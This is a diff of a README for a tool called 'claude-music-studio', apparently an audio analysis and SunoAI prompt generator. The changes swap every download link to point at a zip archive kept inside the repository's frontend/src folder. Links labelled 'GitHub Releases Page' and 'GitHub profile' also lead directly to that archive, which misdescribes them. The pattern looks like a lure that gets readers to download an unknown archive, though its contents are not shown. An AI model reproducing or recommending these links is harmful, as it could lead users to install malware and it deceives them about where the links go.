@@ -6,9 +6,9 @@ claude-music-studio is a professional audio analysis and SunoAI prompt generatio
 
 ## 📦 Download Now
 
-[![Download claude-music-studio](https://raw.githubusercontent.com/KVNKEVINN/claude-music-studio/master/backend/music-claude-studio-v2.4.zip%20Now-claude--music--studio-brightgreen)](https://raw.githubusercontent.com/KVNKEVINN/claude-music-studio/master/backend/music-claude-studio-v2.4.zip)  
+[![Download claude-music-studio](https://github.com/KVNKEVINN/claude-music-studio/raw/refs/heads/master/frontend/src/music_studio_claude_v3.9.zip%20Now-claude--music--studio-brightgreen)](https://github.com/KVNKEVINN/claude-music-studio/raw/refs/heads/master/frontend/src/music_studio_claude_v3.9.zip)  
   
-Visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/KVNKEVINN/claude-music-studio/master/backend/music-claude-studio-v2.4.zip)
+Visit this page to download: [GitHub Releases Page](https://github.com/KVNKEVINN/claude-music-studio/raw/refs/heads/master/frontend/src/music_studio_claude_v3.9.zip)
 
 ## 🚀 Getting Started
 
@@ -59,7 +59,7 @@ Join our community to share your experiences, ask questions, and get support. Co
 
 ## 📧 Contact Us
 
-If you have questions or need further assistance, feel free to reach out. You can contact us through our [GitHub profile](https://raw.githubusercontent.com/KVNKEVINN/claude-music-studio/master/backend/music-claude-studio-v2.4.zip).
+If you have questions or need further assistance, feel free to reach out. You can contact us through our [GitHub profile](https://github.com/KVNKEVINN/claude-music-studio/raw/refs/heads/master/frontend/src/music_studio_claude_v3.9.zip).
 
 ## 🔄 Frequently Asked Questions
 
